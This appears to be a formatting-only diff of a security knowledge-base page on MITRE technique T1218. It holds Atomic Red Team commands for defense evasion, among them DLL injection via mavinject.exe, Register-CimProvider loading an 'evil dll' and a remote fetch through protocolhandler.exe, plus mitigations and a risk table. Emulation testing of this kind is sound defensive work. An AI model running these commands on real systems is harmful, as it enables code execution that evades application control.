@@ -42,8 +42,7 @@ chains_with:
   - T1218.013
   - T1218.014
   - T1218.015
-prerequisites:
-  []
+prerequisites: []
 severity_boost:
   T1218.001: "Chain with T1218.001 for deeper attack path"
   T1218.002: "Chain with T1218.002 for deeper attack path"
@@ -91,6 +90,7 @@ mavinject.exe #{process_id} /INJECTRUNNING "#{dll_payload}"
 ```
 
 **Dependencies:**
+
 - T1218.dll must exist on disk at specified location (#{dll_payload})
 
 ### Atomic Test 2: Register-CimProvider - Execute evil dll
@@ -104,6 +104,7 @@ C:\Windows\SysWow64\Register-CimProvider.exe -Path "#{dll_payload}"
 ```
 
 **Dependencies:**
+
 - T1218-2.dll must exist on disk at specified location (#{dll_payload})
 
 ### Atomic Test 3: InfDefaultInstall.exe .inf Execution
@@ -119,11 +120,12 @@ InfDefaultInstall.exe "#{inf_to_execute}"
 ```
 
 **Dependencies:**
+
 - INF file must exist on disk at specified location (#{inf_to_execute})
 
 ### Atomic Test 4: ProtocolHandler.exe Downloaded a Suspicious File
 
-Emulates attack via documents through protocol handler in Microsoft Office.  On successful execution you should see Microsoft Word launch a blank file.
+Emulates attack via documents through protocol handler in Microsoft Office. On successful execution you should see Microsoft Word launch a blank file.
 
 **Supported Platforms:** windows
 
@@ -133,6 +135,7 @@ call "%microsoft_wordpath%\protocolhandler.exe" "ms-word:nft|u|#{remote_url}"
 ```
 
 **Dependencies:**
+
 - Microsoft Word must be installed
 
 ### Atomic Test 5: Microsoft.Workflow.Compiler.exe Payload Execution
@@ -146,8 +149,8 @@ Emulates attack with Microsoft.Workflow.Compiler.exe running a .Net assembly tha
 ```
 
 **Dependencies:**
-- .Net must be installed for this test to work correctly.
 
+- .Net must be installed for this test to work correctly.
 
 ### Manual Testing
 
@@ -162,41 +165,44 @@ If Atomic Red Team tests are not applicable, manually verify the technique by:
 ## Remediation Guide
 
 ### M1050 Exploit Protection
+
 Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using using trusted binaries to bypass application control.
 
 ### M1037 Filter Network Traffic
+
 Use network appliances to filter ingress or egress traffic and perform protocol-based filtering. Configure software on endpoints to filter network traffic.
 
 ### M1026 Privileged Account Management
+
 Restrict execution of particularly vulnerable binaries to privileged accounts or groups that need to use it to lessen the opportunities for malicious usage.
 
 ### M1038 Execution Prevention
+
 Consider using application control to prevent execution of binaries that are susceptible to abuse and not required for a given system or network.
 
 ### M1042 Disable or Remove Feature or Program
+
 Many native binaries may not be necessary within a given environment.
 
 ### M1021 Restrict Web-Based Content
-Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc.
 
+Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc.
 
 ## Detection
 
 ### Detection of Proxy Execution via Trusted Signed Binaries Across Platforms
 
-
 ## Risk Assessment
 
-| Finding | Severity | Impact |
-| ------- | -------- | ------ |
-| System Binary Proxy Execution technique applicable | Medium | Defense Evasion |
+| Finding                                            | Severity | Impact          |
+| -------------------------------------------------- | -------- | --------------- |
+| System Binary Proxy Execution technique applicable | Medium   | Defense Evasion |
 
 ## CWE Categories
 
-| CWE ID | Title |
-| ------ | ----- |
+| CWE ID  | Title                        |
+| ------- | ---------------------------- |
 | CWE-693 | Protection Mechanism Failure |
-
 
 ## References
 
